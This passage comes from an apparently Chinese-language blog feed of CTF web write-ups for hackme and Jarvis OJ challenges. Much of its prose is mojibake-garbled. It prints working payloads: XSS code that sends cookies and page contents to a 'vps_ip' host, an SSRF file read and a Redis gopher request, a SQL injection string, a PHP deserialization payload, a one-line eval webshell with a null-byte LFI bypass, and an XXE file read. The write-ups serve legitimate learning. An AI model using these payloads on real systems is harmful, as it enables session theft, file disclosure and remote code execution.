&lt;li class="nav-itebSI </span><br><span class="line">      &lt;a class=" nav-link" href="sentmail.php"&gt;Sent Mail&lt;L2E &lt;/li&gt; &lt;li class="nav-itebSI </span><br><span class="line">      &lt;a class=" nav-link" href="setadmin.php"&gt;Set Admin&lt;L2E &lt;/li&gt; &lt;li class="nav-itebSI </span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">" nav-link"</span> <span class="attr">href</span>=<span class="string">"request.php"</span>&gt;</span>Send Request<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                            &lt;/bGk &lt;/ul&gt; &lt;ul class="navbar-nav ml-auto"&gt;</span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-itebSI </span></span></span><br><span class="line">      &lt;span class=" navbar-texdCI Hello, admin (Administrator)&lt;/span&gt; &lt;/bGk &lt;li class="nav-item"&gt;</span><br><span class="line">            &lt;a class="nav-link" href="logout.php"&gt;Logout&lt;L2E &lt;/li&gt; &lt;/dWw &lt;/nav&gt; &lt;div class="containeciI </span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">" card text-white bg-darayI &lt;div class="</span><span class="attr">card-body</span>"&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">"card-titlZSI </span></span></span><br><span class="line"><span class="tag"><span class="string">            4          &lt;/h2&gt;</span></span></span><br><span class="line">          &lt;h4&gt;From: &lt;a href=" sendmail.php?to=jj"&gt;jj&lt;/a&gt;&lt;/aDQ &lt;div class="card-text"&gt;&lt;svg onload="javascript:document.location='http://vps_ip:9999?cookie='+btoa(document.body.innerHTMLKSI &lt;/sdmc &lt;/daXY </span><br><span class="line">        <span class="tag">&lt;/<span class="name">daXY</span> </span></span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">daXY</span></span></span><br></pre></td></tr></table></figure><p>å‘ç°æœ‰ä¸ª <code>request.php</code> ï¼Œæ— æ³•ç›´æ¥è®¿é—®ï¼Œéœ€è¦ <code>admin</code>ã€‚</p><p>æƒ³åŠæ³•è®©çœŸæ­£çš„ <code>admin</code> å»è®¿é—®ä¸€ä¸‹ï¼Œç„¶åæŠŠç›¸åº”çš„ç»“æœè¿”å›ç»™æˆ‘ä»¬ã€‚</p><p>æ—¢ç„¶éƒ½å¯ä»¥æ‰§è¡Œ <code>js</code> ä»£ç äº†ï¼Œé‚£ç›´æ¥æ„é€ ä¸€ä¸ª <code>Ajax</code> è¯·æ±‚ï¼Œè¿™é‡Œç”¨çš„æ˜¯åŸç”Ÿçš„ <code>Ajax</code>ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">var x=new XMLHttpRequest();</span></span></span><br><span class="line"><span class="tag"><span class="string">x.onreadystatechange=function() &#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">    if (x.readyState==4 &amp;&amp; x.status==200) &#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">        document.location='//vps_ip:9999/?code='+btoa(x.responseText);</span></span></span><br><span class="line"><span class="tag"><span class="string">    &#125;</span></span></span><br><span class="line"><span class="tag"><span class="string">&#125;</span></span></span><br><span class="line"><span class="tag"><span class="string">x.open("</span><span class="attr">GET</span>","<span class="attr">request.php</span>",<span class="attr">true</span>);</span></span><br><span class="line"><span class="tag"><span class="attr">x.setRequestHeader</span>("<span class="attr">Content-type</span>","<span class="attr">application</span>/<span class="attr">x-www-form-urlencoded</span>");</span></span><br><span class="line"><span class="tag"><span class="attr">x.send</span>();</span></span><br><span class="line"><span class="tag">"&gt;</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ° <code>request.php</code> è®¿é—®æ¥å£</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">"/request.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">      &lt;textarea name=<span class="string">"url"</span>&gt;&lt;/textarea&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>æœ‰ç”¨çš„åªæœ‰è¿™ä¸€éƒ¨åˆ†ï¼Œä¼ çš„å‚æ•°æ˜¯<code>url</code>ï¼Œæœ‰æ²¡å¯èƒ½æ˜¯æ–‡ä»¶åŒ…å«å‘¢ï¼Ÿç”¨ <code>file://</code> åè®®è¯•è¯•ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">var x=new XMLHttpRequest();</span></span></span><br><span class="line"><span class="tag"><span class="string">x.onreadystatechange=function() &#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">    if (x.readyState==4 &amp;&amp; x.status==200) &#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">        document.location='//vps_ip:9999/?code='+btoa(x.responseText);</span></span></span><br><span class="line"><span class="tag"><span class="string">    &#125;</span></span></span><br><span class="line"><span class="tag"><span class="string">&#125;</span></span></span><br><span class="line"><span class="tag"><span class="string">x.open("</span><span class="attr">POST</span>","<span class="attr">request.php</span>",<span class="attr">true</span>);</span></span><br><span class="line"><span class="tag"><span class="attr">x.setRequestHeader</span>("<span class="attr">Content-type</span>","<span class="attr">application</span>/<span class="attr">x-www-form-urlencoded</span>");</span></span><br><span class="line"><span class="tag"><span class="attr">x.send</span>("<span class="attr">url</span>=<span class="string">file:///var/www/html/config.php</span>");</span></span><br><span class="line"><span class="tag">"&gt;</span></span><br></pre></td></tr></table></figure><p>æˆåŠŸæ‹¿åˆ° <code>flag</code>ï¼Œå¹¶æç¤ºæˆ‘ä»¬ä¸‹ä¸€ä¸ª <code>flag</code> åœ¨ Redis é‡Œã€‚</p><h2 id="xssrf-redis"><a href="#xssrf-redis" class="headerlink" title="xssrf redis"></a><a href="https://xssrf.hackme.inndy.tw/" target="_blank" rel="noopener">xssrf redis</a></h2><blockquote><p>Steal flag from redis</p></blockquote><p>æœ‰äº†ä¸Šä¸€é¢˜çš„ <code>ssrf</code> ï¼Œæ‰“å†…ç½‘ redis ä¹Ÿæ˜¯æ°´åˆ°æ¸ æˆäº†ã€‚</p><p>å…ˆçœ‹ä¸€ä¸‹ä¹‹å‰çš„ <code>request.php</code> æºç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require</span>(<span class="string">'common.php'</span>); </span><br><span class="line">admin_required(); </span><br><span class="line">$msg = []; </span><br><span class="line">$url = <span class="string">''</span>; </span><br><span class="line">$result = <span class="string">''</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) &#123;</span><br><span class="line">    $url = $_POST[<span class="string">'url'</span>]; </span><br><span class="line">    $result = shell_exec(<span class="string">'curl -m 1 --connect-timeout 1 -s '</span> . escapeshellarg($url)); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ„é€  payload æ‰“ä¸‹ Redis</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">gopher:</span><span class="comment">//127.0.0.1:25566/_info</span></span><br><span class="line"></span><br><span class="line">å°†ä¹‹å‰å‘é€çš„æ•°æ®æ”¹ä¸‹å³å¯ã€‚</span><br><span class="line">x.send(<span class="string">"url=gopher://127.0.0.1:25566/_info"</span>);</span><br></pre></td></tr></table></figure><p>æˆåŠŸæ‰“åˆ°å›æ˜¾ï¼Œçœ‹æ¥å°±æ˜¯æœªæˆæƒæ‰“ redis äº†ï¼Œå…¶ä»–çš„å°±æ˜¯è€å¥—è·¯äº†ï¼Œå…·ä½“åˆ©ç”¨æ–¹å¼è§ <a href="[https://wywwzjj.top/2019/05/17/Redis-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8/](https://wywwzjj.top/2019/05/17/Redis-æœªæˆæƒè®¿é—®ç›¸å…³åˆ©ç”¨/)">åšå®¢</a>ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;hide-and-seek&quot;&gt;&lt;a href=&quot;#hide-and-seek&quot; class=&quot;headerlink&quot; title=&quot;hide and seek&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://hackme.inndy.tw/&quot; target=&quot;_bla
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>Jarvis OJ Writeup</title>
    <link href="https://wywwzjj.top/2019/02/02/Jarvis-OJ-Writeup/"/>
    <id>https://wywwzjj.top/2019/02/02/Jarvis-OJ-Writeup/</id>
    <published>2019-02-02T05:08:19.000Z</published>
    <updated>2019-04-04T01:55:58.142Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PORT-51"><a href="#PORT-51" class="headerlink" title="PORT 51"></a>PORT 51</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">âœ  ~ sudo curl --local-port 51 http://web.jarvisoj.com:32770/</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Web 100&lt;/title&gt;</span><br><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line">body &#123;</span><br><span class="line">background:gray;</span><br><span class="line">text-align:center;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h3&gt;Yeah!! Here's your flag:PCTF&#123;&#125;&lt;/h3&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h2><blockquote><p>md5</p></blockquote><p>header å¤´é‡Œé¢å‘ç° hint: â€œselect * from `admin` where password=â€™â€.md5($pass,true).â€â€˜â€œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">md5 ( string $str [, bool $raw_output = <span class="keyword">FALSE</span> ] ) : string</span><br><span class="line"><span class="comment">// raw ä¸º TRUE æ—¶ä¸º 16 å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼ï¼Œé»˜è®¤ä¸º false 32 å­—ç¬¦åå…­è¿›åˆ¶æ•°</span></span><br></pre></td></tr></table></figure><p>æœç´¢ä¸€ä¸‹ï¼Œå‘ç°æœ‰ä¸ªç‰›é€¼çš„å­—ç¬¦ä¸²ï¼š <code>ffifdyop</code></p><p><a href="https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html" target="_blank" rel="noopener">https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html</a></p><p><a href="http://www.am0s.com/functions/204.html" target="_blank" rel="noopener">http://www.am0s.com/functions/204.html</a></p><p>ä¼ å…¥ä¹‹åï¼Œæœ€ç»ˆçš„ sql è¯­å¥å˜ä¸º select * from <code>admin</code> where password=â€™â€™orâ€™6ï¿½]ï¿½ï¿½!r,ï¿½ï¿½bâ€™</p><p>æˆåŠŸé—­åˆï¼Œå¾—åˆ°ä¸‡èƒ½å¯†ç ï¼Œç™»å½•å³å¯ã€‚</p><h2 id="ç¥ç›¾å±€çš„ç§˜å¯†"><a href="#ç¥ç›¾å±€çš„ç§˜å¯†" class="headerlink" title="ç¥ç›¾å±€çš„ç§˜å¯†"></a>ç¥ç›¾å±€çš„ç§˜å¯†</h2><blockquote><p>ååºåˆ—åŒ–</p></blockquote><p>é€šè¿‡ <code>/showimg.php?img=c2hvd2ltZy5waHA=</code> å¯è¯»å–æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// showing.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$f = $_GET[<span class="string">'img'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($f)) &#123;</span><br><span class="line">$f = base64_decode($f);</span><br><span class="line"><span class="keyword">if</span> (stripos($f,<span class="string">'..'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> </span><br><span class="line">&amp;&amp; stripos($f,<span class="string">'\\'</span>)===<span class="keyword">FALSE</span>&amp;&amp; stripos($f,<span class="string">'pctf'</span>)===<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">readfile($f);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"File not found!"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span><br><span class="line">$x = <span class="keyword">new</span> Shield();</span><br><span class="line"><span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">$x = unserialize($g);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $x-&gt;readfile();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// shield.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in pctf.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> $file;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span><br><span class="line">&amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ„é€ åˆ©ç”¨çš„ <code>pop</code> é“¾å³å¯ï¼Œ<strong>payload</strong></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?class=O:<span class="number">6</span>:<span class="string">"Shield"</span>:<span class="number">1</span>:&#123;<span class="string">s:</span><span class="number">4</span>:<span class="string">"file"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"pctf.php"</span>;&#125;</span><br></pre></td></tr></table></figure><h2 id="inject"><a href="#inject" class="headerlink" title="inject"></a>inject</h2><blockquote><p>æœ‰åå¼•å·çš„æ³¨å…¥</p></blockquote><p>è¯¦è§ <a href="https://wywwzjj.top/2019/02/26/Jarvis-OJ-inject/">https://wywwzjj.top/2019/02/26/Jarvis-OJ-inject/</a></p><h2 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h2><blockquote><p>upload + lfi </p></blockquote><p>æ‰«äº†ä¸€éç›®å½•ï¼Œæ²¡å‘ç°ä»€ä¹ˆæ–‡ä»¶ï¼Œå°è¯• filter è¯»æºç ï¼Œä¹Ÿå¤±è´¥äº†</p><p>ä¸»é¢˜ç•Œé¢æ˜¯ä¸€ä¸ªå›¾ç‰‡ä¸Šä¼ ï¼Œå†åŠ ä¸€ä¸ªå±•ç¤ºç•Œé¢</p><p>é…ç½®ä¿¡æ¯ç»™çš„è¿™ä¹ˆæ¸…æ™°ï¼Œæœ‰ç‚¹å¯ç–‘ï¼Œç„¶è€Œå¹¶æ²¡æœ‰æ‰¾åˆ°ä»€ä¹ˆæœ‰ç”¨çš„æ´</p><p>Apache/2.4.18 (Unix) OpenSSL/1.0.2h PHP/5.6.21 mod_perl/2.0.8-dev Perl/v5.16.3</p><p>Warning: fopen(submi.php): failed to open stream: No such file or directory in /opt/lampp/htdocs/index.php on line 24</p><p>æŒ‰ç†è¯´æ˜¯å¯ä»¥æ–‡ä»¶åŒ…å«ï¼Œphp://filter/read=convert.base64-encode/resource=index</p><p>ç„¶è€Œæ˜¾ç¤º Cross domain forbidden!ï¼Œä¼°è®¡æ˜¯åŠ äº†å•¥å­ wafï¼Œæ­¤è·¯ä¸é€š</p><p>fopen() æ—¶åº”è¯¥æ˜¯æ‹¼æ¥äº†ä¸€ä¸ª â€œ.phpâ€ï¼Œè¿™é‡Œå¯ä»¥ç”¨ %00 ç»•è¿‡</p><p>fopen(index.jj): failed to open stream ç»•è¿‡æˆåŠŸ</p><p>å›¾ç‰‡åªèƒ½ä¸Šä¼  jpg ï¼Œæ‰€ä»¥ç›´æ¥æŠ“åŒ…åœ¨åé¢å†ä¸ªä¸€å¥è¯ï¼Œç„¶åç”¨ fopen() å»åŒ…å«</p><p>ä½†æ˜¯ï¼Œæ³¨æ„æ˜¯ä½†æ˜¯ï¼Œè¿™é‡Œæœ‰ä¸ªå‘ï¼Œä¸èƒ½ç”¨ &lt;?phpï¼Œæœ‰ wafï¼Œè¦ç”¨ <script language="php">eval($_POST[1])</script></p><p>ç„¶å page=uploads/1552805580.jpg%00 è‡ªåŠ¨å‡º flagï¼Œéƒ½ä¸éœ€è¦èœåˆ€</p><p>è¿™é¢˜å‡ºçš„å¤ªè¿‡æ­»æ¿ï¼Œ<?=?> æ˜¯å¯ä»¥çš„ï¼Œå±…ç„¶æ²¡ä»»ä½•å›æ˜¾ï¼Œä¸“è€ƒ <script language="php"> æ ‡ç­¾äº†ï¼Œæ²¡æ„ä¹‰</p><p>æœ‰æ—¶é—´è‡ªå·±æ”¹ä¸€æ”¹å‡ºä¸ªé¢˜</p><h2 id="apiè°ƒç”¨"><a href="#apiè°ƒç”¨" class="headerlink" title="apiè°ƒç”¨"></a>apiè°ƒç”¨</h2><blockquote><p> xxe å…¥é—¨</p></blockquote><p>è¯·è®¾æ³•è·å¾—ç›®æ ‡æœºå™¨/home/ctf/flag.txtä¸­çš„flagå€¼ã€‚</p><p>å‚è€ƒ <a href="https://blog.spoock.com/2016/11/15/jarvisoj-web-writeup-1/">https://blog.spoock.com/2016/11/15/jarvisoj-web-writeup-1/</a></p><p>å¸¸è§„ç³»ç»Ÿé‡Œå¯¹æ¥æ”¶çš„è¯·æ±‚éƒ½ä¼šåšé™åˆ¶ï¼Œæ¯”å¦‚POSTä¹‹ä»¥content-typeçš„application/x-www-form-urlencodedæ¥æ”¶ï¼Œä½†åœ¨ä¸€äº›æ¡†æ¶ç³»ç»Ÿé‡Œï¼Œæ¡†æ¶ä¼šè‡ªåŠ¨å¸®å¼€å‘è€…è¯†åˆ«ä¼ å…¥çš„æ•°æ®</p><p> POST æäº¤æ•°æ®çš„å››ç§å¸¸è§æ–¹å¼</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">application</span>/x-www-form-urlencoded </span><br><span class="line">multipart/form-data</span><br><span class="line"><span class="built_in">application</span>/json</span><br><span class="line"><span class="built_in">application</span>/xml</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚ï¼šé»˜è®¤ä¸ºapplication/x-www-form-urlencodedæ¥æ”¶çš„æˆ‘åªéœ€ä¿®æ”¹ä¸º application/json</p><p>å³å¯ä¼ å…¥JSONæ ¼å¼çš„æ•°æ®ï¼ŒXMLåŒç†</p><p>è¿™å°†å¯¼è‡´åŸæœ¬ä¸å­˜åœ¨xmlè§£æçš„åœ°æ–¹å¯èƒ½å­˜åœ¨XXEæ¼æ´</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">XHR</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">â€‹        <span class="keyword">var</span> xhr;</span><br><span class="line"></span><br><span class="line">â€‹        <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> XMLHttpRequest();&#125;</span><br><span class="line"></span><br><span class="line">â€‹        <span class="keyword">catch</span>(e) &#123;</span><br><span class="line"></span><br><span class="line">â€‹            <span class="keyword">var</span> IEXHRVers =[<span class="string">"Msxml3.XMLHTTP"</span>,<span class="string">"Msxml2.XMLHTTP"</span>,<span class="string">"Microsoft.XMLHTTP"</span>];</span><br><span class="line"></span><br><span class="line">â€‹            <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>,len=IEXHRVers.length;i&lt; len;i++) &#123;</span><br><span class="line"></span><br><span class="line">â€‹                <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> ActiveXObject(IEXHRVers[i]);&#125;</span><br><span class="line"></span><br><span class="line">â€‹                <span class="keyword">catch</span>(e) &#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line"></span><br><span class="line">â€‹            &#125;</span><br><span class="line"></span><br><span class="line">â€‹        &#125;</span><br><span class="line"></span><br><span class="line">â€‹        <span class="keyword">return</span> xhr;</span><br><span class="line"></span><br><span class="line">â€‹    &#125;</span><br><span class="line"></span><br><span class="line">â€‹    <span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">â€‹    evil_input = <span class="built_in">document</span>.getElementById(<span class="string">"evil-input"</span>).value;</span><br><span class="line"></span><br><span class="line">â€‹    <span class="keyword">var</span> xhr = XHR();</span><br><span class="line"></span><br><span class="line">â€‹        xhr.open(<span class="string">"post"</span>,<span class="string">"/api/v1.0/try"</span>,<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">â€‹        xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">â€‹            <span class="keyword">if</span> (xhr.readyState==<span class="number">4</span> &amp;&amp; xhr.status==<span class="number">201</span>) &#123;</span><br><span class="line"></span><br><span class="line">â€‹                data = <span class="built_in">JSON</span>.parse(xhr.responseText);</span><br><span class="line"></span><br><span class="line">â€‹                tip_area = <span class="built_in">document</span>.getElementById(<span class="string">"tip-area"</span>);</span><br><span class="line"></span><br><span class="line">â€‹                tip_area.value = data.task.search+data.task.value;</span><br><span class="line"></span><br><span class="line">â€‹            &#125;</span><br><span class="line"></span><br><span class="line">â€‹        &#125;;</span><br><span class="line"></span><br><span class="line">â€‹        xhr.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"application/json"</span>);</span><br><span class="line"></span><br><span class="line">â€‹        xhr.send(<span class="string">'&#123;"search":"'</span>+evil_input+<span class="string">'","value":"own"&#125;'</span>);</span><br><span class="line"></span><br><span class="line">â€‹    &#125;</span><br></pre></td></tr></table></figure><p>payload:</p><p>Content-Type: application/xml</p><p>â€‹    <?xml version="1.0" encoding="utf-8"?></p><p>â€‹    <!DOCTYPE data[</p><p>â€‹    <!ENTITY file SYSTEM "file:////home/ctf/flag.txt"></p><p>]></p><p><data>&file;</data></p><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>â€‹    header å¤´é‡Œé¢å‘ç° hint: "select * from <code>admin</code> where password='".md5($pass,true)."'"</p><p>â€‹    md5 ( string $str [, bool $raw_output = FALSE ] ) : string</p><p>â€‹    string è¦è®¡ç®—çš„å­—ç¬¦ä¸² </p><p>â€‹    raw ä¸º TRUE æ—¶ä¸º 16 å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼ï¼Œé»˜è®¤ä¸º false 32 å­—ç¬¦åå…­è¿›åˆ¶æ•°</p><p>â€‹    å‚è€ƒ <a href="https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html">https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html</a></p><p>â€‹        <a href="http://www.am0s.com/functions/204.html">http://www.am0s.com/functions/204.html</a></p><p>â€‹    æœ‰ä¸ªç‰›é€¼çš„å­—ç¬¦ä¸²ï¼š ffifdyop</p><p>â€‹    ä¼ å…¥ä¹‹åï¼Œæœ€ç»ˆçš„ sql è¯­å¥å˜ä¸º select * from <code>admin</code> where password=''or'6ï¿½]ï¿½ï¿½!r,ï¿½ï¿½b'</p><p>â€‹    æˆåŠŸé—­åˆï¼Œå¾—åˆ°ä¸‡èƒ½å¯†ç </p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><p>â€‹    å’¦ï¼Œå¥‡æ€ªï¼Œè¯´å¥½çš„WEBé¢˜å‘¢ï¼Œæ€ä¹ˆæˆé€†å‘äº†ï¼Ÿä¸è¿‡é‡Œé¢æœ‰ä¸ªhelp_meå‡½æ•°æŒºæœ‰æ„æ€çš„å“¦</p><p>â€‹    é¢˜ç›®ç»™äº†ä¸ª udf.so çš„æ–‡ä»¶ï¼ŒIDA å¯åŠ¨ï¼Œç„¶è€Œå¹¶æ²¡æœ‰å‘ç°å•¥ä¸œè¥¿ï¼ˆæ±‡ç¼–è¿˜è¦åŠ æ²¹</p><p>â€‹    å‰å‡ å¤©åˆšçœ‹äº†MySQLææƒå°±å¿˜äº†ï¼Œåæ¥æ‰çŸ¥é“ udf.so 